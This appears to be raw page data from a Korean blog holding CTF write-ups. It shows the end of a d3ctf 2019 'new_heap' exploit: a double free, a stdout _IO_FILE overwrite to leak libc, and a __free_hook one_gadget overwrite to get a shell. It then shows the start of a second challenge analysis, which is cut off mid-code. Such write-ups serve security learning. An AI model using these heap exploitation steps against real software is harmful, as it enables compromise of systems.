class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAADEElEQVQ4y22S2Y7bOBBF/RsznbZkWwupfV+ohRI3UWvb3TCmkf//kIHsIEg6AeqBL4f31EUdWBrxyKmAledx0RQ1rusOlThHjKZ1r8JIAaFq+irwFQ1oOtR1cNEAMKChw4MTZKghSV5DL8lqgjDPKqJq9sV0zqalaOZJB4oGVM1UNKDoUDUs1bCOOjxq4HDUAR0WPm1ifqt73hAxv997Idf3/1o6pGXb8SkpGj5umE11z6uWpGXjBunr2TicDLtnE2aSyrUhIipqsVzFsl3vn8v1nlVtL2bUko6NYr7WHad8LOo+Re3xYu4wHRa53ui4snGNi5rIhc3ruN1u9+9ZhTGVLR2aXizXe9MLNsx7Nw05GfCgGlbPRyL2cIRpghqx3Ni0vn18ztd7lCEi5qIhLR34tCFMqZiKuk/2ZOOgGjaXG5Mrn94qTGvCh/XWcbl9fNY9L1uyf9qScX3HbOz5VNSdE6YadBUN7HDHxl2MDJjJp3aQFmfT/jGGdTbtC3BOj8fJsBQNHi97+fvOTK7j9jHMVzFfi7bPm04DzouqfTvpP+f1bBw1cLyYT+w5+874kRykRT/MCNMwq8IM2UESpCX04yApvTjfPX/BfsI2lYuYtgS1cr1ZXmQ6oeXHGnRNJ9CgC70IeNEFOF/IH8lVx8iwVJilqE0R9pLcT8swR2GO/KRQLubr2fgz9rmz1bGJjqtc35uek3HBbADunqlb7jPw+OCPf9HW952pXKqOZzXOKhxmCLjhSbc06BpOYNi+bnnADc+m/Re4F1NLB4SpWK7j9j6uNyoXzMeWiDBDTphYfhxmSIPu7v9FG/ORT29RXjVEZDWGfuQleZgj4IWG5UEvgm5ouqFhe6oOvxbWi4mNa0tl0RLMR7newqyMixr6kRtlUVYFaRmkyPbjx4X8rt1SKaYNU4mZtPw4yqt/jud/lcu3k/6iai/K5eWXO/kNPmqAyq1jY0OHYb32wxSkhQ69vSfbMx+FnQxL1eEX5x02nCDKqqRsgBsaTpBWreXHRUPCDFl+HGQoLZvTH9gT/h/N8/GBcOa2rgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png\"\n        srcset=\"/static/dfec5074f1609d93b8deaeec6076a1f4/e9ff0/11.png 180w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/f21e7/11.png 360w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png 513w\"\n        sizes=\"(max-width: 513px) 100vw, 513px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>_IO_FILE 구조체의 stdout을 확인해 보면 우리가 변조해야 할 부분은 <code class=\"language-text\">_flags</code>, <code class=\"language-text\">_IO_write_base</code> 이다.</li>\n<li>기존의 stdout flags 값은 <code class=\"language-text\">0xfbad2887</code> , <code class=\"language-text\">_IO_IS_APPENDING</code> 플래그가 존재하지 않기 때문에 <code class=\"language-text\">0xfbad2887 | 0x1000</code> 값으로 조작하자</li>\n<li><code class=\"language-text\">_IO_write_base</code> 값의 하위 바이트를 <code class=\"language-text\">\\x20</code> 으로 조작해 라이브러리 주소를 출력 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x20\"</span><span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> <span class=\"token function\">uu64</span><span class=\"token punctuation\">(</span><span class=\"token function\">r</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3eb780</span>\none_shot <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x4f3c2</span>\nfree_hook <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x3ed8e8</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one_shot \"</span><span class=\"token punctuation\">,</span>one_shot<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"free_hook\"</span><span class=\"token punctuation\">,</span>free_hook<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhklEQVQoz5XR62rcMBAF4H2QsuuLRpqRxpIl2Wt77Y0vySZtaNrC0gZ62bbv/xIlaSlJGgKFw/yaDw6c1fF4u58uy7I3XMVcBYERqAVy97cSSNpmyqaShSqEMutcbQT+zur4+bQfzw0yIjtTamTIUQkCgQpI5kppm0mTAKWgU6C/8g6/v/kwX900/aHpZ9f0TjsWqgTUgKXAAkhIs5GcgsmkzqReP8TL67chNC7XBZgosBLKS47KstQRuQbSxJmyibQC7dPan779mKdDRVun46jtLKlBV5mmIFcXfgZtjc3Jp+hBe0nFY/z1+zBdimLKuc3DdpC8VTboHZOP7BdB1riUwvP445fTOMwTmAF5IZ6l3pHxZU3GlT52uijYCfIZBcnhKb49/dyP540powttO3QuulCHeeFt53c9sDXWx27iavDtGRA/wtPFm3Y/j1fXF9fvbNWuBd6tIjARmORqk6kNUHKfhyP9wYfpUPdTd7ZU7cBl9e/HC1ltq5ZcIBsSoFcp/Bf+BRU8cnZelPcRAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png\"\n        srcset=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/e9ff0/12.png 180w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/f21e7/12.png 360w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png 720w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/efc66/12.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>라이브러리 주소를 획득할 수 있다.</li>\n</ul>\n<h2 id=\"shell\" style=\"position:relative;\"><a href=\"#shell\" aria-label=\"shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>shell!</h2>\n<ul>\n<li>Double Free Bug를 통해 __free_hook에 할당을 한 후 oneshot 가젯 주소로 조작한다.</li>\n<li>free 함수를 호출하여 쉘을 획득 할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>one_shot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 702px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHElEQVQoz43P7U6DMBgF4F6IG2Ol9IOWlsKgdIXCgH1EnboY4/1fiVET/2yZJOfPSd4nJy+wXH2c306v73LjctuHVC8oj7EQEQmugphcxRzGbIVoEBHQcPV5vhzOF6ErbVpRWJSkISQI3cBrnASIhYiufipYI2pc78cjSWQQYUh4iOgywstby0uIgwj/VSAId7b10ymRefztfy/InIBJ6oNts7pRhckrJ7IyjNlcPHD51A51N8m8VJuayTyAeAHjWdjktfejNo3IyqzcMllQqYlQs/Bj5bxxmXGpLnVpicgiKiBOHkK0WMf3/wcdS1+6yR+fjeua4WDbgauCiCxRBU01JPyOBzs/ut2+cr3rRusH68etH5t+v7Htv/gLF0NkkHZ2PV8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png\"\n        srcset=\"/static/f9aedffc660490664fdf82d881bd8f5b/e9ff0/13.png 180w,\n/static/f9aedffc660490664fdf82d881bd8f5b/f21e7/13.png 360w,\n/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png 702w\"\n        sizes=\"(max-width: 702px) 100vw, 702px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\">보호 기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#alloc\">alloc</a></li>\n<li><a href=\"#free\">free</a></li>\n<li><a href=\"#memory-leak-idea\">memory leak Idea</a></li>\n<li><a href=\"#_io_file_stdout\">_IO_FILE_stdout</a></li>\n<li><a href=\"#stdout\">stdout</a></li>\n<li><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\">_IO_new_file_xsputn 함수</a></li>\n<li><a href=\"#new_do_write-%ED%95%A8%EC%88%98\">new_do_write 함수</a></li>\n<li><a href=\"#how-to-exploit-using-stdout\">How to exploit using stdout</a></li>\n<li><a href=\"#double-free-bug\">Double Free Bug</a></li>\n<li><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\">Fake chunk 구성</a></li>\n<li><a href=\"#how-to-free\">How to Free?</a></li>\n<li><a href=\"#free-fake-chunk\">Free Fake chunk</a></li>\n<li><a href=\"#point-to-stdout\">point to stdout</a></li>\n<li><a href=\"#overwrite-stdout-struct\">Overwrite Stdout Struct</a></li>\n<li><a href=\"#shell\">shell!</a></li>\n</ul>\n</div>","excerpt":"취약점 분석 바이너리 개요 보호 기법 main 함수 분석   함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다. alloc  메모리 동적할당 과정을 확인해 보면 전역 포인터 배열  에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다. 사용자의 입력값이  이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다. free  free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다. 하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다. memory leak Idea 어떻게 하면 메모리 주소값을 릭할 수 있을 까? 힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다. _IO_FILE_stdout  파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수…","frontmatter":{"date":"September 18, 2020","title":"d3ctf 2019 new_heap 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍣"},"fields":{"slug":"/d3ctf2019_new_heap_ctf_writeup/"}},"next":{"id":"8880760b-3ccd-50c9-b8e4-3779cab3598b","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>traveller<span class=\"token operator\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB executable\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span>\nversion <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token punctuation\">.</span><span class=\"token number\">32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>b551cbb805a21e18393c3816ffd28dfb11b1ff1e\nwith debug_info\n<span class=\"token operator\">not</span> stripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffe8fb89000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007f7aeab6c000</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007f7aeaf5d000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ checksec \nCANARY    <span class=\"token operator\">:</span> disabled\nFORTIFY   <span class=\"token operator\">:</span> disabled\nNX        <span class=\"token operator\">:</span> ENABLED\nPIE       <span class=\"token operator\">:</span> disabled\nRELRO     <span class=\"token operator\">:</span> Partial</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">trip 구조체\n<span class=\"token operator\">=</span><span class=\"token operator\">></span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> destination\n<span class=\"token operator\">=</span><span class=\"token operator\">></span>ssize_t distance\n\n<span class=\"token operator\">--</span> global variables <span class=\"token operator\">--</span>\nTRIPS_NUM <span class=\"token operator\">=</span> <span class=\"token number\">7</span>\nTOTAL_RUN <span class=\"token operator\">=</span> <span class=\"token number\">14</span>\ntrip<span class=\"token operator\">*</span> trips<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span>\ntIndex <span class=\"token operator\">=</span> <span class=\"token number\">0</span></code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nHello! Welcome to trip management system. \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%p \\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> choice_num<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nChoose an option: \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n1. Add a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"2. Change a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"3. Delete a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"4. Check a trip \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tchoice_num <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>choice_num<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">delet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span>\n\t\t\t<span class=\"token function\">getTrip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>argc 스택 주소가 노출되는 것을 확인할 수 있으며, 총 4개의 메뉴를 선택할 수 있다.</li>\n<li>Add 메뉴는 동적 할당을 진행한다.</li>\n<li>Change는 해당 할당되어진 값을 변경한다.</li>\n<li>Delete는 해제</li>\n<li>Check는 할당된 값을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"add-함수\" style=\"position:relative;\"><a href=\"#add-%ED%95%A8%EC%88%98\" aria-label=\"add 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>add 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token 